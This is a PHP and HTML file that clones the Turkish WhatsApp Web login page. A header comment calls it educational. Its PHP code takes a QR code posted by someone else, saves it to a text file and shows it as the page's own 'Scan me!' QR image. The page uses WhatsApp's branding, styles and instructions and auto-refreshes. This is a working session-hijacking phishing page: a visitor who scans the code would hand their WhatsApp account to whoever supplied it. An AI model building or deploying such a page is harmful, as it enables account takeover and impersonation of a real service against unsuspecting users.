<!DOCTYPE html>
<!--
Bu proje eğitim amaçlı By& Ebubekir Bastama tarafından kodlanmıştır.
Bazı yerlerin'de hata var demeyin bilerek bıraktım :) vs vs.
-->
<?php
if (@$_POST["qrcode"] != "") { //Post veri boş olup olmadığını kontrol ediyoruz.
    //Eski Base64 verisini sil.
    remove_line("resim.txt", 0);
    //Eski Base64 verisini sil.
    //Post ile gelen base64 verisini kaydet
    $base64resim = $_POST["qrcode"];
    $resim = fopen("resim.txt", "r+");
    fwrite($resim, $base64resim);
    //Post ile gelen base64 verisini kaydet
}

function remove_line($file, $remove) {
    $lines = file($file, FILE_IGNORE_NEW_LINES);
    foreach ($lines as $key => $line) {
        if ($line === $remove)
            unset($lines[$key]);
    }
    $data = implode(PHP_EOL, $lines);
    file_put_contents($file, $data);
}
?>
<!-- Tipik Whatshapp Html Kodu  -->
<html class="js serviceworker adownload cssanimations csstransitions webp webp-alpha webp-animation webp-lossless" dir="LTR" loc="tr" lang="tr"><head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <title>WhatsApp</title>
    <meta name="viewport" content="width=device-width">
    <meta name="google" content="notranslate">
    <meta name="format-detection" content="telephone=no">
    <meta http-equiv="refresh" content="5;URL=index.php">
    <meta name="description" content="Quickly send and receive WhatsApp messages right from your computer.">
    <meta name="og:description" content="Quickly send and receive WhatsApp messages right from your computer.">
    <meta name="og:url" content="https://web.whatsapp.com/">
    <meta name="og:title" content="WhatsApp Web">
    <meta name="og:image" content="https://www.whatsapp.com/img/whatsapp-promo.png">



    <link rel="apple-touch-icon" sizes="194x194" href="https://web.whatsapp.com/apple-touch-icon.png" type="image/png">

        <link rel="stylesheet" href="https://web.whatsapp.com/cssm_99362fa8365d8e39028c84edca18e758.css">

            <style>
                html, body, #app {
                    height: 100%;
                    width: 100%;
                    overflow: hidden;
                    padding: 0;
                    margin: 0;
                }

                #app {
                    position: absolute;
                    top: 0;
                    left: 0;
                }

                #startup, #initial_startup {
                    width: 100%;
                    height: 100%;
                    position: fixed;
                    background-color: #f2f2f2;

                    -moz-user-select: none;
                    -webkit-user-select: none;

                    display: flex;
                    align-items: center;
                    justify-content: center;
                    display: -webkit-box;
                    display: -webkit-flex;
                    -webkit-align-items: center;
                    -webkit-justify-content: center;
                    flex-direction: column;
                    -webkit-flex-direction: column;
                }

                .spinner-container {
                    -webkit-animation: rotate 2s linear infinite;
                    animation: rotate 2s linear infinite;
                    z-index: 2;
                }

                .spinner-path {
                    stroke-dasharray: 1,150;
                    stroke-dashoffset: 0;
                    stroke: #acb9bf;
                    stroke-linecap: round;
                    -webkit-animation: dash 1.5s ease-in-out infinite;
                    animation: dash 1.5s ease-in-out infinite;
                }

                @keyframes rotate {
                    100% {
                        transform: rotate(360deg);
                    }
                }
                @-webkit-keyframes rotate{
                    100% {
                        -webkit-transform: rotate(360deg);
                    }
                }

                @keyframes dash {
                    0% {
                        stroke-dasharray: 1,150;
                        stroke-dashoffset: 0;
                    }
                    50% {
                        stroke-dasharray: 90,150;
                        stroke-dashoffset: -35;
                    }
                    100% {
                        stroke-dasharray: 90,150;
                        stroke-dashoffset: -124;
                    }
                }
                @-webkit-keyframes dash {
                    0% {
                        stroke-dasharray: 1,150;
                        stroke-dashoffset: 0;
                    }
                    50% {
                        stroke-dasharray: 90,150;
                        stroke-dashoffset: -35;
                    }
                    100% {
                        stroke-dasharray: 90,150;
                        stroke-dashoffset: -124;
                    }
                }

                .progress-container {
                    width: 360px;
                    position: fixed;
                    padding-top: 120px;
                    top: 50%;
                    left: 50%;
                    margin-left: -180px;
                }

                progress {
                    -webkit-appearance: none;
                    appearance: none;
                    width: 100%;
                    height: 3px;
                    border: none;
                    margin: 0;
                    color: #02d1a4;
                    background-color: #e0e4e5;
                }

                progress[value]::-webkit-progress-bar {
                    background-color: #e0e4e5;
                }

                progress[value]::-webkit-progress-value {
                    background-color: #02d1a4;
                }

                progress[value]::-moz-progress-bar {
                    background-color: #02d1a4;
                }
            </style>
            <script id="vendor1.b8bc7eb3766beed76b69.js" type="text/javascript" charset="utf-8" async="" src="/vendor1.b8bc7eb3766beed76b69.js"></script><script id="vendor2.020fd0f68598fe34c663.js" type="text/javascript" charset="utf-8" async="" src="https://web.whatsapp.com//vendor2.020fd0f68598fe34c663.js"></script><script id="https://web.whatsapp.com/progress_script_/app.72bef20e954c41fc886c.js" type="text/javascript" charset="utf-8" async="" src="/app.72bef20e954c41fc886c.js"></script><script id="progress_script_/app3.04023e62bfb930619312.js" type="text/javascript" charset="utf-8" async="" src="/app3.04023e62bfb930619312.js"></script><script id="progress_script_/app2.53c2c7a532e834b96c55.js" type="text/javascript" charset="utf-8" async="" src="/app2.53c2c7a532e834b96c55.js"></script><style id="asset-style" type="text/css"></style><script type="text/javascript" charset="utf-8" async="" src="/svg.ddb56cb9352690663b78.js"></script><script type="text/javascript" charset="utf-8" async="" src="/app2.53c2c7a532e834b96c55.js"></script><link id="favicon" rel="shortcut icon" href="/img/c5088e888c97ad440a61d247596f88e5.png" type="image/png" src="/img/c5088e888c97ad440a61d247596f88e5.png"><link id="favicon" rel="shortcut icon" href="/img/c5088e888c97ad440a61d247596f88e5.png" type="image/png" src="/img/c5088e888c97ad440a61d247596f88e5.png"><script id="progress_script_/vendor1.b8bc7eb3766beed76b69.js" type="text/javascript" charset="utf-8" async="" src="/vendor1.b8bc7eb3766beed76b69.js"></script></head>
                    <body class="web">
                    <div id="app"><div class="_1FKgS app-wrapper-web bN4GZ"><span></span><div class="landing-wrapper"><div class="landing-header"><span class="_3CSsZ"><svg xmlns="http://www.w3.org/2000/svg" width="39" height="39" viewBox="0 0 39 39"><path fill="#00E676" d="M10.7 32.8l.6.3c2.5 1.5 5.3 2.2 8.1 2.2 8.8 0 16-7.2 16-16 0-4.2-1.7-8.3-4.7-11.3s-7-4.7-11.3-4.7c-8.8 0-16 7.2-15.9 16.1 0 3 .9 5.9 2.4 8.4l.4.6-1.6 5.9 6-1.5z"></path><path fill="#FFF" d="M32.4 6.4C29 2.9 24.3 1 19.5 1 9.3 1 1.1 9.3 1.2 19.4c0 3.2.9 6.3 2.4 9.1L1 38l9.7-2.5c2.7 1.5 5.7 2.2 8.7 2.2 10.1 0 18.3-8.3 18.3-18.4 0-4.9-1.9-9.5-5.3-12.9zM19.5 34.6c-2.7 0-5.4-.7-7.7-2.1l-.6-.3-5.8 1.5L6.9 28l-.4-.6c-4.4-7.1-2.3-16.5 4.9-20.9s16.5-2.3 20.9 4.9 2.3 16.5-4.9 20.9c-2.3 1.5-5.1 2.3-7.9 2.3zm8.8-11.1l-1.1-.5s-1.6-.7-2.6-1.2c-.1 0-.2-.1-.3-.1-.3 0-.5.1-.7.2 0 0-.1.1-1.5 1.7-.1.2-.3.3-.5.3h-.1c-.1 0-.3-.1-.4-.2l-.5-.2c-1.1-.5-2.1-1.1-2.9-1.9-.2-.2-.5-.4-.7-.6-.7-.7-1.4-1.5-1.9-2.4l-.1-.2c-.1-.1-.1-.2-.2-.4 0-.2 0-.4.1-.5 0 0 .4-.5.7-.8.2-.2.3-.5.5-.7.2-.3.3-.7.2-1-.1-.5-1.3-3.2-1.6-3.8-.2-.3-.4-.4-.7-.5h-1.1c-.2 0-.4.1-.6.1l-.1.1c-.2.1-.4.3-.6.4-.2.2-.3.4-.5.6-.7.9-1.1 2-1.1 3.1 0 .8.2 1.6.5 2.3l.1.3c.9 1.9 2.1 3.6 3.7 5.1l.4.4c.3.3.6.5.8.8 2.1 1.8 4.5 3.1 7.2 3.8.3.1.7.1 1 .2h1c.5 0 1.1-.2 1.5-.4.3-.2.5-.2.7-.4l.2-.2c.2-.2.4-.3.6-.5s.4-.4.5-.6c.2-.4.3-.9.4-1.4v-.7s-.1-.1-.3-.2z"></path></svg></span><div class="landing-headerTitle">WhatsApp Web</div></div><div class="landing-window"><div class="landing-main"><div class="_3XczR"><div class="dXU0Q"><div class="landing-title _2mVeK">WhatsApp'ı bilgisayarınızda kullanmak için</div><ol class="_3oE3H"><li class="_2eNdO">WhatsApp'ı telefonunuzda açın</li><li class="_2eNdO"><span dir="ltr" class="selectable-text invisible-space copyable-text"><strong><span dir="ltr" class="selectable-text invisible-space copyable-text">Menü <span class="_3CSsZ"><svg height="24px" viewBox="0 0 24 24" width="24px"><rect fill="#f2f2f2" height="24" rx="3" width="24"></rect><path d="m12 15.5c.825 0 1.5.675 1.5 1.5s-.675 1.5-1.5 1.5-1.5-.675-1.5-1.5.675-1.5 1.5-1.5zm0-2c-.825 0-1.5-.675-1.5-1.5s.675-1.5 1.5-1.5 1.5.675 1.5 1.5-.675 1.5-1.5 1.5zm0-5c-.825 0-1.5-.675-1.5-1.5s.675-1.5 1.5-1.5 1.5.675 1.5 1.5-.675 1.5-1.5 1.5z" fill="#818b90"></path></svg></span></span></strong> veya <strong><span dir="ltr" class="selectable-text invisible-space copyable-text">Ayarlar <span class="_3CSsZ"><svg width="24" height="24" viewBox="0 0 24 24"><rect fill="#F2F2F2" width="24" height="24" rx="3"></rect><path d="M9.34 8.694a4.164 4.164 0 0 0-1.606 3.289c0 1.338.63 2.528 1.61 3.292l-1.46 2.527a7.065 7.065 0 0 1-3.052-5.82c0-2.41 1.206-4.54 3.048-5.816l1.46 2.528zm6.713 2.859c-.217-2.079-1.992-3.739-4.148-3.739-.578 0-1.128.116-1.628.329L8.819 5.617a7.042 7.042 0 0 1 3.086-.704c3.76 0 6.834 2.958 7.059 6.64h-2.91zm-1.065.43a3.083 3.083 0 1 1-6.166 0 3.083 3.083 0 0 1 6.166 0zm-6.164 6.364l1.458-2.523a4.153 4.153 0 0 0 1.623.322 4.154 4.154 0 0 0 4.12-3.524h2.922a7.062 7.062 0 0 1-7.042 6.426c-1.105 0-2.15-.25-3.081-.7zm11.197-7.21a7.88 7.88 0 0 0-.404-1.824l.286-.12a.527.527 0 0 0-.403-.973l-.29.12a8.176 8.176 0 0 0-1.197-1.77l.231-.23a.526.526 0 1 0-.744-.744l-.234.234a8.17 8.17 0 0 0-1.775-1.18l.13-.31a.526.526 0 1 0-.972-.403l-.12.313a8.463 8.463 0 0 0-1.995-.405v-.35A.533.533 0 0 0 12 2.97a.533.533 0 0 0-.535.526v.338a8.02 8.02 0 0 0-2.173.416l-.13-.313a.526.526 0 0 0-.972.402l.129.311a8.171 8.171 0 0 0-1.775 1.18l-.235-.235a.526.526 0 0 0-.743.744l.23.231A8.175 8.175 0 0 0 4.6 8.34l-.29-.12a.526.526 0 0 0-.403.971l.285.122a7.882 7.882 0 0 0-.404 1.824h-.322a.533.533 0 0 0-.526.534c0 .29.235.535.526.535h.28c.02.831.166 1.624.418 2.378l-.257.1a.523.523 0 1 0 .402.968l.252-.105a8.17 8.17 0 0 0 1.191 1.797l-.187.187a.526.526 0 1 0 .744.743l.184-.183a8.173 8.173 0 0 0 1.792 1.208l-.096.231a.526.526 0 1 0 .972.403l.096-.23c.698.24 1.436.387 2.208.428v.243c0 .29.244.526.535.526.29 0 .534-.235.534-.526v-.253a8.012 8.012 0 0 0 2.03-.417l.09.229a.523.523 0 1 0 .967-.403l-.096-.231a8.172 8.172 0 0 0 1.792-1.208l.184.183a.526.526 0 1 0 .743-.744l-.187-.186a8.174 8.174 0 0 0 1.191-1.798l.252.104a.526.526 0 1 0 .403-.971l-.257-.095a8.074 8.074 0 0 0 .417-2.378h.281c.29 0 .526-.244.526-.535a.533.533 0 0 0-.526-.534h-.323z" fill="#818B90"></path></svg></span></span></strong> simgesine dokunun ve <strong>WhatsApp Web</strong>'i seçin</span></li><li class="_2eNdO">Kodu almak için telefonunuzu bu ekrana doğrultun</li></ol></div><div class="XSdna"><div class="_2EZ_m" data-ref="1@Uxm6a8qrMjXmM5e+fN7RZYdAoRqXbX+FjcBYN47XmFw53QB4KW0aCNGR,c8LsMafYIHg2pQtlODNhgjUjgOg9f03rFa3HFQg1xGw=,OCXUfdZYqw1hBnNn7V9hzg=="><span></span><div class="_1jjYO"><span class="_3CSsZ"><svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 64 64"><path fill="#FFF" d="M6.525 43.936a29.596 29.596 0 0 1-3.039-13.075C3.494 14.568 16.755 1.313 33.05 1.313c7.904.004 15.328 3.082 20.91 8.666 5.581 5.586 8.653 13.01 8.65 20.907-.007 16.294-13.266 29.549-29.558 29.549a29.648 29.648 0 0 1-12.508-2.771L1.391 62.687l5.134-18.751z"></path><path fill="#123033" d="M50.801 13.135c-4.739-4.742-11.039-7.354-17.752-7.357-13.837 0-25.094 11.253-25.099 25.085a25.039 25.039 0 0 0 3.349 12.541l-3.56 12.999 13.304-3.488a25.084 25.084 0 0 0 11.996 3.054h.011c13.83 0 25.088-11.256 25.095-25.087.002-6.703-2.607-13.005-7.344-17.747zM33.05 51.733h-.008a20.866 20.866 0 0 1-10.62-2.906l-.762-.452-7.894 2.07 2.108-7.694-.497-.789a20.802 20.802 0 0 1-3.189-11.097c.004-11.496 9.361-20.85 20.87-20.85a20.73 20.73 0 0 1 14.746 6.115 20.733 20.733 0 0 1 6.104 14.752c-.006 11.497-9.363 20.851-20.858 20.851z"></path><path fill="#123033" d="M25.429 19.26a8.65 8.65 0 0 0-1.028.011 2.352 2.352 0 0 0-.95.255c-.221.114-.427.277-.75.582-.305.288-.481.54-.668.782a6.974 6.974 0 0 0-1.443 4.291l.001.003a8.243 8.243 0 0 0 .844 3.607c1.043 2.307 2.763 4.746 5.035 7.008a24.676 24.676 0 0 0 1.657 1.6 24.145 24.145 0 0 0 9.814 5.229s.751.179 1.391.218c.021.001.04.003.061.003a9.207 9.207 0 0 0 1.422-.033 5.086 5.086 0 0 0 2.129-.59c.423-.225.623-.337.978-.561 0 0 .11-.072.319-.23.345-.257.558-.438.845-.736.211-.22.394-.479.534-.772.2-.417.401-1.213.481-1.874.061-.505.042-.781.036-.952-.011-.275-.238-.558-.487-.678l-1.486-.668s-2.222-.967-3.581-1.587a1.278 1.278 0 0 0-.452-.104c-.341-.021-.723.068-.966.324v-.004c-.013-.001-.182.145-2.031 2.385-.102.122-.341.387-.754.362a1.086 1.086 0 0 1-.185-.029 3.402 3.402 0 0 1-.49-.17c-.316-.134-.427-.185-.643-.278l-.013-.006a15.361 15.361 0 0 1-4.013-2.556 15.88 15.88 0 0 1-.927-.885c-1.074-1.041-1.953-2.148-2.607-3.24-.035-.06-.09-.146-.15-.242-.107-.174-.225-.381-.262-.523-.095-.376.157-.678.157-.678s.622-.68.911-1.05c.278-.356.518-.704.671-.952.301-.484.39-.982.238-1.37a216.767 216.767 0 0 0-2.219-5.215c-.156-.339-.598-.589-1.005-.636a6.284 6.284 0 0 0-.414-.041"></path></svg></span></div><canvas width="264" height="264" style="display: none;"></canvas>
                                                    <img alt="Scan me!" src="

<?php
//Burada Post veri ile gelen base64 qr code verisini ilgili yere yerleştiriyoruz.
$dosya = fopen('resim.txt', 'r');
$icerik = fread($dosya, filesize('resim.txt'));
echo $icerik;
fclose($dosya);
?>" style="display: block;"></div></div><a href="https://faq.whatsapp.com/faq/web/28080003/" class="_1rQYj" target="_blank">Başlamak için yardım mı gerekiyor?</a><div class="_2FvAY"><span></span><label><input type="checkbox" name="rememberMe" checked="">Oturumu açık tut</label></div></div></div><div class="_2l_cS"><div class="_3B3rJ"><span><div class="_2MnOX" role="button" style="opacity: 1;"><div class="_1Mvrp"><div class="Hplbe"><svg xmlns="http://www.w3.org/2000/svg" width="28" height="34" viewBox="0 0 28 34"><path fill="#FFF" d="M1 4.983v24.034a2.982 2.982 0 0 0 4.564 2.53L24.792 19.53a2.981 2.981 0 0 0 0-5.058L5.563 2.454A2.983 2.983 0 0 0 1 4.983z"></path></svg></div></div></div><img crossorigin="anonymous" src="https://web.whatsapp.com/img/07f8d2958696dceefa4f4676aeb4663e.jpg" class="UZJEe" style="visibility: visible;"></span></div></div></div></div></div></div>

                    <script src="/progress.5363a6cd3ab30ce786644f04e468f605.js"></script>

                    <div id="hard_expire_time" data-time="1570320801.241"></div>

                    <script src="https://web.whatsapp.com/locales/tr.3c4f2d375620113102a7.js"></script>


                    </body>
</html>
